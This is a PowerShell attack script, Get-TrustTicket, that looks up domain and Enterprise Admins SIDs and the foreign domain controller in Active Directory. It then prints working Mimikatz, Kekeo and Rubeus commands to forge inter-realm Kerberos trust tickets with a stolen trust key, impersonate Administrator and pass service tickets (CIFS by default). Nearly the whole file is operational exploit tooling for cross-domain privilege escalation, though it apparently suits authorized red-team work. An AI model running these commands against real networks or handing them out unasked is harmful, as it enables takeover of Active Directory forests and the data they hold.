function Get-TrustTicket{
    <#
    .SYNOPSIS
    Generate command needed for the crafting of inter-realm TGTs (trust attacks) and TGS for Mimikatz, Kekeo and Rubeus.
    
    Author: Rafael Pimentel (@gustanini)
    Required Dependency: Active Directory Module

    .DESCRIPTION
    This script generates the command required for crafting inter-realm/referral TGTs and subsequent TGS for Mimikatz, Kekeo and Rubeus.

    .PARAMETER targetDomain
    The target domain for which the golden ticket will be crafted. This is a mandatory parameter.

    .PARAMETER trustKey
    The trust key (RC4) to be used for forging the golden ticket. This is a mandatory parameter.

    .PARAMETER Service
    The Kerberos service principal name (SPN) for which the ticket is requested. Default is "krbtgt".

    .PARAMETER Domain
    The current domain. Default is the current domain obtained using Get-ADDomain.

    .PARAMETER User
    The user account to be impersonated. Default is "Administrator".

    .PARAMETER Outfile
    The path to save the generated golden ticket file. Default is "C:\Temp\$Domain-$TargetDomain.kirbi".

    .PARAMETER targetGroup
    The target group whose SID will be included in the golden ticket. Default is "Enterprise Admins".
    
    .PARAMETER targetService
    The target service that will be included in the TGS SPN. Default is "CIFS".

    .PARAMETER targetComputer
    The target computer that will be included in the TGS SPN. If not specified, the foreign domain controller will be the target computer.

    .EXAMPLE
    Get-TrustTicket -targetDomain "gustanini.local" -trustKey "C286A0D9DF4137DE792B74317F54D1A1"
    Calculates the flags for crafting a golden ticket for the specified target domain and trust key.

    .NOTES
    This function requires the Active Directory module for PowerShell. Ensure that the Microsoft Active Directory Module is installed and available in your PowerShell session. This module is typically available on systems that have the Active Directory Domain Services (AD DS) role installed, or by installing the Remote Server Administration Tools (RSAT) package.
    .LINK
    https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adobject
    #>
    # params
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$targetDomain,
        [Parameter(Mandatory = $true)]
        [string]$trustKey,
        [string]$Service = "krbtgt",
        [string]$Domain = (Get-ADDomain).DnsRoot,
        [string]$User = "Administrator",
        [string]$Outfile = "C:\Temp\$Domain-$TargetDomain.kirbi",
        [string]$targetGroup = "Enterprise Admins",
        [string]$tgsService = "CIFS",
        [string]$targetComputer 
    )
    # get domain SID
    $SID = (Get-ADDomain -Identity $Domain).DomainSID.Value
    # get target group SID
    $TargetGroupSID = (Get-ADGroup -Server $TargetDomain -Filter {Name -eq $TargetGroup}).SID.Value
    # get target domain controller
    $targetDC = (Get-ADDomainController -Server $targetDomain).HostName

    # get target computer for TGS
    if (-not $targetComputer){
        $targetComputer = $targetDC
    }

    # generate commands
    $mimiTGT = "kerberos::golden /service:$Service /user:$User /domain:$Domain /sid:$SID /rc4:$trustKey /target:$targetDomain /sids:$TargetGroupSID /ticket:$Outfile"
    $kekeoTGS = "tgs::ask /tgt:$Outfile /service:$tgsService/$targetComputer"

    $rubeusTGT = "Rubeus.exe silver /sids:$TargetGroupSID /target:$targetDomain /rc4:$trustKey /sid:$SID /domain:$Domain /user:$User /service:$Service/$targetDomain /ldap /nowrap"
    $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsService/$targetComputer /dc:$targetDC /nowrap /ptt"

    Write-Host `n"Printing: Mimikatz TGT command" `n -ForegroundColor Yellow 
    Write-Host $mimiTGT `n
    Write-Host "Printing: Kekeo TGS command" `n -ForegroundColor Green
    Write-Host $kekeoTGS `n

    Write-Host "Printing: Rubeus TGT command" `n -ForegroundColor Yellow
    Write-Host $rubeusTGT `n
    Write-Host "Printing: Rubeus TGS command" `n -ForegroundColor Green 
    Write-Host $rubeusTGS `n
}